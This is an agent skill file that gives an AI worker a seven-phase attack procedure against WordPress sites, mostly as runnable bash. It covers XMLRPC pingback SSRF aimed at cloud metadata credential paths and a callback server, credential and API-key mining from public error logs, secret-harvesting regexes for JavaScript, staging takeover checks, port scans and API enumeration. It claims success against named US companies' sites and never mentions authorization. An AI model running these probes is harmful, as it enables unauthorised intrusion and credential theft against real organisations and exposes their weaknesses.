---
name: deep-invade
description: Deep pentest WP: SSRF, plugin CVE, JS mine, port scan chain.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, pentest, deep, SSRF, CVE, wordpress]
    category: recon
    related_skills:
      - wp-mass-recon
      - xmlrpc-exploitation
      - error-log-mining
      - js-secrets-extraction
      - staging-subdomain-hunt
      - wordpress-plugin-hunt
      - port-service-discovery
      - cors-credential-wordpress
      - source-leak-hunt
      - phpinfo-to-rce
---

# Deep Invade Skill

Comprehensive deep pentest methodology for targets flagged as high-value by wp-mass-recon (score >= 6). Goes beyond surface recon into SSRF via XMLRPC pingback, error log credential mining, plugin CVE exploitation, JavaScript secret extraction, subdomain/staging discovery, port scanning, and API enumeration. Proven across 7 US company targets over 9 waves of increasingly deep probes.

## When to Use

- `wp-mass-recon` scored a target >= 6 (CORS confirmed, XMLRPC open, source leaks found).
- You are assigned a single high-value target for deep assessment.
- After surface recon, you need to find the chain that leads to RCE or data breach.
- Running Wave 6-9 style deep probes against priority targets.

## Prerequisites

- `terminal` tool on the worker container.
- Target already scored >= 6 from wp-mass-recon (WordPress confirmed, at least 2 of: CORS/XMLRPC/source leak).
- Collaborator endpoint (Burp Collaborator, interactsh, or your own server) for SSRF/blind confirmation.
- `nmap` available on the worker for port scanning.

## How to Run

Execute probes in order. Each phase builds on the previous:

1. Extended SSRF probe (XMLRPC pingback to IMDS, localhost, internal IPs)
2. Error log mining (fetch and grep for creds, paths, SQL)
3. Plugin CVE matrix (30+ REST namespaces, readme.txt versions)
4. JavaScript bundle analysis (11 regex patterns for secrets)
5. Subdomain/staging enumeration (crt.sh, httpx, WP install pages)
6. Port scan (nmap -F for MySQL, FTP, SSH, internal APIs)
7. API discovery (Swagger, GraphQL, WooCommerce, Gravity Forms)

## Quick Reference

| Phase | Technique | Source Wave | Tool | Time |
|-------|-----------|-------------|------|------|
| 1 | SSRF probe (15 IMDS paths + 14 IAM roles + GCP + internal) | Wave6/Wave7 | curl + XMLRPC pingback | 2 min |
| 2 | Error log mining (DB creds, API keys, SQL, salts, emails) | Wave6/Wave8 | Python regex (mine_error_log) | 1 min |
| 3 | Plugin CVE matrix (40+ namespaces + readme.txt versions) | Wave6/Wave7 | curl + regex | 3 min |
| 4 | JS secret extraction (11 patterns, 20 bundles/target) | Wave7 | dl_and_scan_js() | 2 min |
| 5 | Subdomain/staging (crt.sh + httpx + WP install pages) | Wave5/Wave8/Wave9 | crt.sh, httpx, curl | 5 min |
| 6 | Port scan (nmap -F + banner grab + 21-port extended) | Wave6/Wave9 | nmap, nc, socket | 30 sec |
| 7 | API discovery (Swagger, GraphQL, WC, GF, 20+ endpoints) | Wave6/Wave7 | curl + regex | 2 min |

## Cross-Wave Evolution (How Deep Invade Gets Better Each Wave)

| Wave | New Capability | Key Discovery |
|------|---------------|---------------|
| 5 | Staging discovery, JS bundles, SliderRev REST | staging.biglots.com with 25 REST namespaces |
| 6 | SSRF confirmation, CORS matrix, plugin namespaces | 15 IMDS paths all faultCode 0 on staging |
| 7 | IMDS role guessing, Yoast sitemap, JS secrets | Google API key found in patientportal JS |
| 8 | WP install pages, Elementor 500, backup files | staging.biglots.com install.php HTTP 200 |
| 9 | Pattern catalog, cross-wave synthesis, regression tracking | MySQL+FTP+IMAP opened on wines.com, Exchange+VPN on realpro.com |

## Procedure

### Phase 1 — Extended SSRF Probe

```bash
TARGET="$1"
COLLAB="$2"  # Your Burp Collaborator / interactsh URL

echo "[*] Phase 1: SSRF Probe"

# Test 1: Confirm pingback SSRF to your callback
curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
  -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>$COLLAB</string></value></param>
<param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" | grep faultCode

echo "[*] Check Collaborator for callback — if received, SSRF confirmed"

# Test 2: AWS IMDSv1 (15 paths)
for path in "" "iam/security-credentials/" "iam/security-credentials/admin" \
  "iam/security-credentials/ec2-admin" "iam/security-credentials/s3-full-access" \
  "user-data/" "placement/availability-zone" "public-keys/0/openssh-key" \
  "network/interfaces/macs/" "security-groups" "ami-id" "hostname" \
  "instance-id" "mac" "profile"; do

  result=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
    -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>http://169.254.169.254/latest/meta-data/$path</string></value></param>
<param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')

  code=$(echo "$result" | grep -o '[0-9]\+')
  [[ "$code" == "0" ]] && echo "[SSRF] IMDS reachable: /$path" || echo "[--]   IMDS blocked: /$path (faultCode=$code)"
done

# Test 3: Internal network probes
for ip in "127.0.0.1:80" "127.0.0.1:3306" "127.0.0.1:8080" "127.0.0.1:3000" \
  "10.0.0.1:80" "172.16.0.1:80" "192.168.0.1:80" "localhost:22"; do

  result=$(curl -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
    -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
<params><param><value><string>http://$ip/</string></value></param>
<param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')

  code=$(echo "$result" | grep -o '[0-9]\+')
  [[ "$code" == "0" ]] && echo "[SSRF] Internal reachable: $ip" || true
done
```

### Phase 2 — Error Log Mining

```bash
TARGET="$1"

echo "[*] Phase 2: Error Log Mining"

# Fetch error_log (can be multi-MB)
curl -sk --max-time 30 "https://$TARGET/error_log" -o /tmp/error_log_$TARGET.txt 2>/dev/null
curl -sk --max-time 30 "https://$TARGET/wp-content/debug.log" >> /tmp/error_log_$TARGET.txt 2>/dev/null

size=$(wc -c < /tmp/error_log_$TARGET.txt 2>/dev/null)

if [[ "$size" -gt 100 ]]; then
  echo "[+] Error log found: ${size} bytes"

  # Extract server paths
  echo "[*] Server paths:"
  grep -oP '/[a-zA-Z0-9/_.-]+\.php' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -20

  # Extract email addresses
  echo "[*] Email addresses:"
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/error_log_$TARGET.txt 2>/dev/null | sort -u | head -10

  # Extract DB credentials
  echo "[*] DB credentials:"
  grep -iE 'mysql_connect|mysqli_connect|new PDO|DB_HOST|DB_USER|DB_PASSWORD|database.*password' /tmp/error_log_$TARGET.txt 2>/dev/null | head -5

  # Extract SQL queries
  echo "[*] SQL queries:"
  grep -iE 'SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|JOIN' /tmp/error_log_$TARGET.txt 2>/dev/null | head -10

  # Extract API keys
  echo "[*] API keys:"
  grep -iE 'api_key|api_secret|access_token|auth_token|bearer' /tmp/error_log_$TARGET.txt 2>/dev/null | head -5

  # PHP error summary
  echo "[*] Error summary:"
  echo "  Fatal: $(grep -ci 'Fatal error' /tmp/error_log_$TARGET.txt)"
  echo "  Warning: $(grep -ci 'Warning' /tmp/error_log_$TARGET.txt)"
  echo "  Notice: $(grep -ci 'Notice' /tmp/error_log_$TARGET.txt)"
  echo "  Deprecated: $(grep -ci 'Deprecated' /tmp/error_log_$TARGET.txt)"

  # Date range
  echo "[*] Date range:"
  head -1 /tmp/error_log_$TARGET.txt | grep -oP '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
  tail -1 /tmp/error_log_$TARGET.txt | grep -oP '\[\d{2}-[A-Za-z]{3}-\d{4}' 2>/dev/null
else
  echo "[-] No error log found"
fi
```

### Phase 3 — Plugin CVE Matrix

```bash
TARGET="$1"

echo "[*] Phase 3: Plugin CVE Matrix"

# Probe 30+ plugin REST namespaces
declare -A PLUGINS
PLUGINS[revslider]="/wp-json/revslider/v1/slides|CVE-2024-2534 (RCE)|Slider Revolution"
PLUGINS[elementskit]="/wp-json/elementskit/v1/|CVE-2023-6851/6853 (RCE)|ElementsKit"
PLUGINS[elementor]="/wp-json/elementor/v1/globals|CVE-2024-xxxx (info disclosure)|Elementor"
PLUGINS[gravityforms]="/wp-json/gf/v2/forms|CVE-2024-6115 (auth bypass)|Gravity Forms"
PLUGINS[jetpack]="/wp-json/jetpack/v4/|CVE-2024-1782 (info disclosure)|Jetpack"
PLUGINS[litespeed]="/wp-json/litespeed/v1/|CVE-2024-50550 (privilege escalation)|LiteSpeed Cache"
PLUGINS[woocommerce]="/wp-json/wc/v3/products|API info disclosure|WooCommerce"
PLUGINS[yoast]="/wp-json/yoast/v1/|SEO data disclosure|Yoast SEO"
PLUGINS[acf]="/wp-json/acf/v3/|CVE-2023-xxxx (info disclosure)|Advanced Custom Fields"
PLUGINS[contactform7]="/wp-json/contact-form-7/v1/|Configuration leak|Contact Form 7"
PLUGINS[solidwp]="/wp-json/solidwp-mail/v1/|Mail log disclosure|SolidWP Mail"
PLUGINS[wpsl]="/wp-json/wpsl/v1/|Store locator data|WP Store Locator"
PLUGINS[redirection]="/wp-json/redirection/v1/|Redirect log exposure|Redirection"
PLUGINS[wpml]="/wp-json/wpml/v1/|Translation data|WPML"
PLUGINS[rankmath]="/wp-json/rankmath/v1/|SEO data|Rank Math"

for plugin in "${!PLUGINS[@]}"; do
  IFS='|' read -r path cve name <<< "${PLUGINS[$plugin]}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET$path" 2>/dev/null)
  if [[ "$code" == "200" || "$code" == "401" || "$code" == "403" ]]; then
    echo "[PLUGIN] $name ($plugin) — HTTP $code — $cve"

    # If 200, try to get version from readme.txt
    if [[ "$code" == "200" ]]; then
      ver=$(curl -sk --max-time 5 "https://$TARGET/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
      [[ -n "$ver" ]] && echo "         Version: $ver"
    fi
  fi
done

# Also probe readme.txt for elementor, revslider (common alternate paths)
for slug in "elementor" "revslider" "js_composer" "wp-rocket" \
  "wordfence" "woocommerce" "jetpack" "litespeed-cache"; do
  ver=$(curl -sk --max-time 5 "https://$TARGET/wp-content/plugins/$slug/readme.txt" 2>/dev/null | grep -i "stable tag" | head -1)
  [[ -n "$ver" ]] && echo "[VERSION] $slug: $ver"
done
```

### Phase 4 — JavaScript Secret Extraction

See `js-secrets-extraction` skill for full procedure. Quick scan:

```bash
TARGET="$1"

# Fetch homepage and common JS bundles
curl -sk --max-time 10 "https://$TARGET/" -o /tmp/page_$TARGET.html 2>/dev/null
JS_URLS=$(grep -oP 'src="[^"]+\.js[^"]*"' /tmp/page_$TARGET.html 2>/dev/null | sed 's/src="//;s/"//' | head -10)

for js_url in $JS_URLS; do
  # Make relative URLs absolute
  [[ "$js_url" =~ ^// ]] && js_url="https:$js_url"
  [[ "$js_url" =~ ^/ ]] && js_url="https://$TARGET$js_url"

  content=$(curl -sk --max-time 10 "$js_url" 2>/dev/null)

  # 11 regex patterns
  echo "$content" | grep -oP '(?:api_key|apiKey|API_KEY)["\s:=]+["'\''][A-Za-z0-9_-]{20,}'
  echo "$content" | grep -oP 'https?://[a-zA-Z0-9.-]+\.(?:amazonaws|cloudfront)\.(?:com|net)[^"'\''\s]*'
  echo "$content" | grep -oP 'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
  echo "$content" | grep -oP 'AKIA[0-9A-Z]{16}'
  echo "$content" | grep -oP '[a-z0-9-]+\.firebaseio\.com'
  echo "$content" | grep -oP '[a-z0-9-]+\.supabase\.co'
  echo "$content" | grep -oP 'sk_live_[0-9a-zA-Z]{24,}'
  echo "$content" | grep -oP 'ghp_[0-9a-zA-Z]{36}'
  echo "$content" | grep -oP 'xox[bprs]-[0-9a-zA-Z-]+'
  echo "$content" | grep -oP '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}'
  echo "$content" | grep -oP 'AIza[0-9A-Za-z_-]{35}'
done | sort -u
```

### Phase 5 — Subdomain/Staging Discovery

See `staging-subdomain-hunt` skill. Quick scan:

```bash
TARGET="$1"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||')

echo "[*] Phase 5: Subdomain/Staging Discovery"

# crt.sh certificate transparency
curl -sk "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u > /tmp/subs_$DOMAIN.txt

sub_count=$(wc -l < /tmp/subs_$DOMAIN.txt)
echo "[+] crt.sh: $sub_count subdomains"

# Filter for interesting ones
echo "[*] Interesting subdomains:"
grep -iE 'staging|stage|dev|test|uat|beta|old|new|admin|portal|api|app|dashboard' /tmp/subs_$DOMAIN.txt | head -20

# Probe them for WordPress install pages (staging takeover vector)
echo "[*] Staging takeover check:"
for sub in $(grep -iE 'staging|stage|dev' /tmp/subs_$DOMAIN.txt | head -5); do
  for path in "/wp-admin/install.php" "/wp-admin/upgrade.php" "/wp-admin/setup-config.php"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$sub$path" 2>/dev/null)
    [[ "$code" == "200" ]] && echo "[TAKEOVER] https://$sub$path — HTTP $code"
  done
done
```

### Phase 6 — Port Scan

```bash
TARGET="$1"
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||')

echo "[*] Phase 6: Port Scan"

nmap -F --open -T4 "$DOMAIN" -oN /tmp/nmap_$DOMAIN.txt 2>/dev/null

echo "[*] Open ports:"
grep 'open' /tmp/nmap_$DOMAIN.txt

# Flag critical exposures
grep -q '3306.*open' /tmp/nmap_$DOMAIN.txt && echo "[CRITICAL] MySQL 3306 open to internet!"
grep -q '27017.*open' /tmp/nmap_$DOMAIN.txt && echo "[CRITICAL] MongoDB 27017 open to internet!"
grep -q '6379.*open' /tmp/nmap_$DOMAIN.txt && echo "[HIGH] Redis 6379 open to internet!"
grep -q '8080.*open\|8081.*open\|8082.*open\|8084.*open' /tmp/nmap_$DOMAIN.txt && echo "[HIGH] Internal API port(s) exposed!"
grep -q '22.*open' /tmp/nmap_$DOMAIN.txt && echo "[INFO] SSH 22 open"
grep -q '21.*open' /tmp/nmap_$DOMAIN.txt && echo "[INFO] FTP 21 open"
```

### Phase 7 — API Discovery

```bash
TARGET="$1"

echo "[*] Phase 7: API Discovery"

# Swagger / OpenAPI
for path in "swagger.json" "swagger.yaml" "openapi.json" "api-docs" "api/docs" \
  "swagger-ui.html" "swagger/index.html" "api/v1/swagger.json" "v2/api-docs" "v3/api-docs"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/$path")
  [[ "$code" == "200" ]] && echo "[API] Swagger: /$path"
done

# GraphQL
for path in "graphql" "api/graphql" "gql" "query" "wp/graphql"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$TARGET/$path" \
    -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}')
  [[ "$code" == "200" ]] && echo "[API] GraphQL: /$path"
done

# WooCommerce API
curl -sk "https://$TARGET/wp-json/wc/v3/" | python3 -c "
import sys, json
try:
  data = json.load(sys.stdin)
  if 'namespace' in data:
    print('[API] WooCommerce REST API active')
except: pass" 2>/dev/null

# Gravity Forms API
curl -sk "https://$TARGET/wp-json/gf/v2/forms" | python3 -c "
import sys, json
try:
  data = json.load(sys.stdin)
  if isinstance(data, list) and len(data) > 0:
    print(f'[API] Gravity Forms: {len(data)} forms')
except: pass" 2>/dev/null
```

## Pitfalls

- **SSRF faultCode 0 is NOT proof of reachability.** Some servers return 0 for unreachable hosts. Always confirm with your own collaborator callback first.
- **Error logs can be multi-GB.** Use `curl -r 0-100000` to fetch only the first 100KB for sampling.
- **Plugin namespace HTTP 200 doesn't mean the plugin is present.** Some themes/setups return 200 for all `/wp-json/` paths. Check response body for actual plugin data.
- **nmap requires root for SYN scan.** Use `-sT` (TCP connect) if running as non-root inside the container.

## Verification

- Every SSRF callback MUST appear on your controlled collaborator/interactsh server.
- Error log MUST contain real PHP errors (not be a generic HTML page).
- Plugin CVEs MUST be verified against actual version numbers from readme.txt (not just namespace presence).
- Port scan results MUST be confirmed with banner grab (`nmap -sV`).
